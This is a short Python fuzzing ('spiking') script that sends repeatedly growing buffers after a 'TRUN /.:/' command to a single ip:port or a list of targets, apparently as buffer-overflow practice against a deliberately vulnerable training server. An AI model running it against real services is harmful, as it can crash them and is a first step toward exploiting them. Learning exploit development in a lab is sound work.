#!/usr/bin/python3
import socket
import sys
import argparse
from datetime import datetime
from time import sleep

def print_banner():
	print ("********************************************************************")
	print ("*                         BO finder                                *")
	print ("* Spiking script that sends buffers to a list of targets           *")
	print ("********************************************************************")

def connect_and_send_payload(host, port, multiples = 1):
	print ('Trying {}:{}'.format(host,port))
	
	# Create a Socket
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
	except:
		print("Can't create socket...")
		return

	# Connect to the Server
	#try:
	connect=s.connect((host, port))
	#except:
	#	print ("Connect to {}:{} failed...".format(host,port))
	#	s.close()
	#	return
	
	# main loop
	buffer = args.buffer
	#try:
	for i in range(multiples):	
		print ("Payload {}:".format(i))
		s.send((b"TRUN /.:/" + str.encode(buffer)))
		print ("Sent " + buffer)
		#banner=s.recv(1024)
		sleep(1)
		buffer = buffer + args.buffer
	s.close()
	#except:
	#	print ('Send or receive from {}:{} failed...'.format(host, port))
	#	s.close()
	#	return

print_banner()

# Argument parsing
parser = argparse.ArgumentParser(description='Spiking script that sends buffers to a list of targets.')
group2 = parser.add_mutually_exclusive_group()
parser.add_argument("-b", "--buffer", help="buffer to send")
parser.add_argument("-m", "--multiples", type=int, help="times to send the buffer - if given, the buffer is sent increasingly from 1 to \"multiples\" times")
group2.add_argument("-t", "--target", help="ip:port of the target")
group2.add_argument("-T", "--targetlist", help="path to targetlist file where targets are in form ip:port")
args = parser.parse_args()

# Reading files into arrays
if args.targetlist is not None:
	try:
		with open(args.targetlist, 'r') as targetsfile:
    			targetlist = targetsfile.readlines()
	except:
		print ("Can't open targetlist file ", args.targetlist)
		sys.exit(0)
	#print targetlist

if args.multiples and args.multiples < 1:
	print ("multiple value is illegal. Exiting.")
	sys.exit(0)

print ("Time started: " + str(datetime.now()))
if args.targetlist is None:
	host = args.target.split(":")[0]
	port = int(args.target.split(":")[1])
	if args.multiples:
		connect_and_send_payload(socket.gethostbyname(host), port, args.multiples)
	else:
		connect_and_send_payload(socket.gethostbyname(host), port)
else:
	# Here we assume successfull file parsing
	for target in targetlist:
		host = target.split(":")[0]
		port = int(target.split(":")[1])
		if args.multiples:
			connect_and_send_payload(socket.gethostbyname(host), port, args.multiples)
		else:
			connect_and_send_payload(socket.gethostbyname(host), port)
